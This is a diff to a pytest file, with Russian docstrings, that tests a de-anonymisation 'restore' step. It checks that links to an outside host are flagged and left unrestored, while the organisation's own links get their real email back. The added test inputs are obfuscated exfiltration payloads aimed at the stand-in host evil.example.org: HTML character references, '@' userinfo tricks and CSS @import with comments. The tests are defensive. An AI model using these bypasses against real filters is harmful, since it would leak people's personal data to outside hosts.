@@ -187,6 +187,78 @@ def test_nothing_is_restored_inside_a_foreign_link(settings, answer):
     assert (result.text, kinds(result)) == (answer, ["foreign_link"])
 
 
+@pytest.mark.parametrize(
+    "answer",
+    [
+        '<a href="&#47;&#47;evil.example.org/?q=<EMAIL_1>">',
+        '<a href="&sol;&sol;evil.example.org/?q=<EMAIL_1>">',
+        '<a href="&#x2F;&#x2f;evil.example.org/?q=<EMAIL_1>">',
+        '<a href="&#47&#47evil.example.org/?q=<EMAIL_1>">',
+        '<a href="https&colon;evil.example.org/?q=<EMAIL_1>">',
+        '<a href="&#47;&#47;host-1.domain-1.example&commat;evil.example.org/?q=<EMAIL_1>">',
+        '<a href="&#47;&#47;host-1.domain-1.example&#64evil.example.org/?q=<EMAIL_1>">',
+        '<a href="&#47;&#47;host-1.domain-1.example&#9;&#10;@evil.example.org/?q=<EMAIL_1>">',
+        '<a href="&#47;&#47;host-1.domain-1.example&nbsp;x@evil.example.org/?q=<EMAIL_1>">',
+        '<a href="&#47;&#47;host-1.domain-1.example&nbspevil.example.org/?q=<EMAIL_1>">',
+        '<a href="&#' + "0" * 5000 + '47;&#47;evil.example.org/?q=<EMAIL_1>">',
+        '<a href="mailto&colon;boss@evil.example.org?body=<EMAIL_1>">',
+        '<p style="background:url(&#47;&#47;evil.example.org/?q=<EMAIL_1>)">',
+        '<p style="background:url(&bsol;2f&bsol;2f evil.example.org/?q=<EMAIL_1>)">',
+        '<img srcset="a.png 1x, &#47;&#47;evil.example.org/?q=<EMAIL_1> 2x">',
+        "<a href=&#47;&#47;evil.example.org/?q=<EMAIL_1>>",
+        "<a href=&#47;&#47;host-1.domain-1.example:<EMAIL_1>@evil.example.org/>",
+        "[x](&#47;&#47;evil.example.org/?q=<EMAIL_1>)",
+        "![x](https&colon;evil.example.org/?q=<EMAIL_1>)",
+        "[1]: <&#47;&#47;evil.example.org/?q=<EMAIL_1>>",
+        "[1]: &#47;&#47;evil.example.org/?q=<EMAIL_1>",
+    ],
+)
+def test_character_references_in_a_link_target_are_decoded(settings, answer):
+    """Хэнд-офф, P1: браузер раскрывает ссылки на знаки HTML в атрибуте (и в атрибуте без кавычек) до разбора
+    адреса, CommonMark — в цели ссылки и в определении: «&#47;&#47;evil…» — это «//evil…», «&commat;» прячет чужой
+    хост за нашим, числовая ссылка без «;» и с тысячами нулей раскрывается тоже. «&nbsp» без «;» перед буквой
+    атрибут не раскрывает — хост один и чужой, хотя html.unescape оборвал бы его пробелом на нашем имени."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer",
+    ['<img data-src="//evil&#46;example&#46;org/?q=<PERSON_1>">', "'//evil&period;example&period;org/?q=<PERSON_1>'"],
+)
+def test_character_reference_dot_makes_a_protocol_relative_link_foreign(settings, answer):
+    """Та же находка: «//имя» без точки — не внешний узел («//TODO:» в коде), но «&#46;» — это точка."""
+    result = restore(person_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (
+            '<a href="https&#58;//host-1.domain-1.example/a?q=<EMAIL_1>">',
+            '<a href="https&#58;//srv-dc01.contoso.ru/a?q=ivanov@contoso.ru">',
+        ),
+        (
+            '<a href="&#47;&#47;host-1.domain-1.example/?a=1&amp;q=<EMAIL_1>&notify=1&region=ru">',
+            '<a href="&#47;&#47;srv-dc01.contoso.ru/?a=1&amp;q=ivanov@contoso.ru&notify=1&region=ru">',
+        ),
+        (
+            "[вики](https://host-1.domain-1.example/a?b=1&amp;c=<EMAIL_1>)",
+            "[вики](https://srv-dc01.contoso.ru/a?b=1&amp;c=ivanov@contoso.ru)",
+        ),
+        ("<a href=https://host-1.domain-1.example/?q=<EMAIL_1>>", "<a href=https://srv-dc01.contoso.ru/?q=ivanov@contoso.ru>"),
+        ("[1]: https://host-1.domain-1.example/<EMAIL_1>", "[1]: https://srv-dc01.contoso.ru/ivanov@contoso.ru"),
+        ("[INFO]: <EMAIL_1> вошёл", "[INFO]: ivanov@contoso.ru вошёл"),
+        ("src = <EMAIL_1>, Tom &amp; Jerry", "src = ivanov@contoso.ru, Tom &amp; Jerry"),
+    ],
+)
+def test_own_links_with_character_references_are_restored(settings, answer, restored):
+    """Та же находка с другой стороны: наш адрес, записанный ссылками на знаки, «&amp;» и «&notify=» в запросе,
+    наш адрес в атрибуте без кавычек и в определении без угловых скобок восстанавливаются, как и текст рядом."""
+    assert restore(link_state(), answer, settings).text == restored
+
+
 def test_host_is_after_the_last_at_sign(settings):
     """Найдено при исправлении обратных косых, P1: браузер берёт хост за последним «@» адреса, а не за первым —
     «https://a@наш:1@evil…» ведёт на evil. Имя пользователя и пароль у нашего адреса ссылку чужой не делают."""
@@ -195,6 +267,40 @@ def test_host_is_after_the_last_at_sign(settings):
     assert (result.text, kinds(result)) == (answer, ["foreign_link"])
     own = restore(link_state(), "https://a:b@host-1.domain-1.example:8080/?q=<EMAIL_1>", settings)
     assert own.text == "https://a:b@srv-dc01.contoso.ru:8080/?q=ivanov@contoso.ru"
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        '<a href="https://host-1.domain-1.example x@evil.example.org/?q=<EMAIL_1>">',
+        '<a href="https:// @evil.example.org/?q=<EMAIL_1>">',
+        "<img src='//host-1.domain-1.example\N{NO-BREAK SPACE}x@evil.example.org/p?q=<EMAIL_1>'>",
+        "[1]: <https://host-1.domain-1.example x:y@evil.example.org/?q=<EMAIL_1>>",
+    ],
+)
+def test_userinfo_runs_through_whitespace(settings, answer):
+    """Найдено при исправлении ссылок на знаки HTML, P1: пробел в имени пользователя браузер кодирует как «%20» и
+    адрес им не кончает (WHATWG URL, authority state) — «https://наш x@evil…» ведёт на evil."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (
+            '<img srcset="https://host-1.domain-1.example/a.png 1x, https://host-1.domain-1.example/<EMAIL_1>.png 2x">',
+            '<img srcset="https://srv-dc01.contoso.ru/a.png 1x, https://srv-dc01.contoso.ru/ivanov@contoso.ru.png 2x">',
+        ),
+        (
+            '<meta content="0;url=https://host-1.domain-1.example/?to=<EMAIL_1> a@b">',
+            '<meta content="0;url=https://srv-dc01.contoso.ru/?to=ivanov@contoso.ru a@b">',
+        ),
+    ],
+)
+def test_own_link_with_whitespace_and_at_signs_after_the_host_is_restored(settings, answer, restored):
+    """Та же находка с другой стороны: «@» после «/» или «?» — уже не имя пользователя, и наш адрес восстанавливается."""
+    assert restore(link_state(), answer, settings).text == restored
 
 
 def test_own_links_and_labels_next_to_foreign_links_are_restored(settings):
@@ -285,6 +391,52 @@ def test_nothing_is_restored_inside_a_foreign_css_url(settings, answer):
     image-set)."""
     result = restore(link_state(), answer, settings)
     assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        '@import/**/"https://evil.example.org/?q= <EMAIL_1>";',
+        "<style>@import /* стили */ 'https://evil.example.org/?q= <EMAIL_1>';</style>",
+        '@import\n/* a */ /* b */\n"https://evil.example.org/?q= <EMAIL_1>"',
+        r'@\69mport/**/"https://evil.example.org/?q= <EMAIL_1>";',
+        '@import/**/"https://evil.example.org/?q=;<EMAIL_1>";',
+        "@import /* см. https://evil.example.org/?q=<EMAIL_1>",
+    ],
+)
+def test_nothing_is_restored_inside_an_import_after_a_comment(settings, answer):
+    """Хэнд-офф, P2: между @import и строкой браузер пропускает и комментарии, не только пробелы. Комментарий без
+    конца тянется до конца ответа, как в CSS, и адрес в нём тоже проверяется."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (
+            "@import url(https://host-1.domain-1.example/<EMAIL_1>.css);",
+            "@import url(https://srv-dc01.contoso.ru/ivanov@contoso.ru.css);",
+        ),
+        (
+            '@import /* автор <EMAIL_1> */ "https://host-1.domain-1.example/a.css";',
+            '@import /* автор ivanov@contoso.ru */ "https://srv-dc01.contoso.ru/a.css";',
+        ),
+        (
+            '@import "https://evil.example.org/a.css"; /* автор <EMAIL_1> */',
+            '@import "https://evil.example.org/a.css"; /* автор ivanov@contoso.ru */',
+        ),
+        (
+            "Правило @import подключает стили (см. https://wiki.example.org/css), автор <EMAIL_1>",
+            "Правило @import подключает стили (см. https://wiki.example.org/css), автор ivanov@contoso.ru",
+        ),
+    ],
+)
+def test_own_and_nearby_imports_are_restored(settings, answer, restored):
+    """Та же находка с другой стороны: наш адрес в @import и метка в комментарии перед ним восстанавливаются, как и
+    метка после закрытой строки и в тексте, где @import только упомянут: ссылка — лишь пробелы и комментарии за
+    @import и первая строка после них."""
+    assert restore(link_state(), answer, settings).text == restored
 
 
 @pytest.mark.parametrize(
